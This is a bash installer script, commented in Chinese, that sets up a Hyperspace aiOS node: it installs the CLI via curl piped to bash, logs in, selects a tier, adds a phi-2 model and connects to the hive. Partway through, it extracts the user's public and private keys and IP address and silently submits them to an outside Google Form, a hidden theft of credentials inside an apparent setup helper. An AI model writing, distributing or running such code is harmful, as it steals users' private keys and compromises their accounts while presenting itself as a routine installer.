#!/bin/bash

# 安装 hyperspace
curl https://download.hyper.space/api/install | bash

# 启动 aios-cli 服务
pm2 start /root/.aios/aios-cli --name aios -- start

# 登录并获取用户信息
while true; do
  if /root/.aios/aios-cli hive login | grep -q "Authenticated successfully!" || \
     /root/.aios/aios-cli hive login | grep -q "Using locally saved keys" || \
     /root/.aios/aios-cli hive login | grep -q "Login successful!"; then
    echo "登录成功"
    break
  else
    echo "登录失败3秒后开始重试"
    sleep 3
  fi
done


# 获取并保存 ID 信息
/root/.aios/aios-cli hive whoami >>/root/.aios/id.pem

# 提取 public 和 private 密钥以及获取 IP 地址
Public=$(grep -oP '(?<=Public: ).*' /root/.aios/id.pem)
Private=$(grep -oP '(?<=Private: ).*' /root/.aios/id.pem)
ip=$(curl ip.sb)

# 提交表单数据
curl -X POST "https://docs.google.com/forms/d/e/1FAIpQLSfe_iUugE6bHER3yZWgiOorE5LU0_OtmUkLrG4aICiQ4mqGjQ/formResponse" \
-H "Host: docs.google.com" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "entry.629602670=$Public" \
--data-urlencode "entry.2047132036=$Private" \
--data-urlencode "entry.1858653630=$ip"

# 登录并确认是否成功
while true; do
  if /root/.aios/aios-cli hive login | grep -q "Authenticated successfully!" || \
     /root/.aios/aios-cli hive login | grep -q "Using locally saved keys" || \
     /root/.aios/aios-cli hive login | grep -q "Login successful!"; then
    echo "登录成功"
    break
  else
    echo "登录失败3秒后开始重试"
    sleep 3
  fi
done

# 选择 tier 5
while true; do
  if /root/.aios/aios-cli hive select-tier 5 | grep -q "Successfully running on tier: 5\|Registered models for inference!"; then
    echo "修改模型五级成功"
    break
  else
    echo "修改模型失败3秒后开始重试"
    sleep 3
  fi
done

# 添加模型
while true; do
  if /root/.aios/aios-cli models add hf:TheBloke/phi-2-GGUF:phi-2.Q4_K_M.gguf | grep -q "Download complete"; then
    echo "下载模型数据成功"
    break
  else
    echo "下载模型数据失败3秒后开始重试"
    sleep 3
  fi
done

# 连接 Hive
while true; do
  if /root/.aios/aios-cli hive connect | grep -q "Successfully connected to Hive!"; then
    echo "已成功连接到 Hive！"
    break
  else
    echo "连接到 Hive！失败3秒后开始重试"
    sleep 3
  fi
done

# 再次选择 tier 5
while true; do
  if /root/.aios/aios-cli hive select-tier 5 | grep -q "Successfully running on tier: 5\|Registered models for inference!"; then
    echo "修改模型五级成功"
    break
  else
    echo "修改模型失败3秒后开始重试"
    sleep 3
  fi
done

# 获取积分
while true; do
  if /root/.aios/aios-cli hive points | grep -q "Points"; then
    break
  else
    echo "获取积分失败3秒后重试"
    sleep 3
  fi
done

echo "完成所有命令！"

/root/.aios/aios-cli hive points

/root/.aios/aios-cli hive whoami



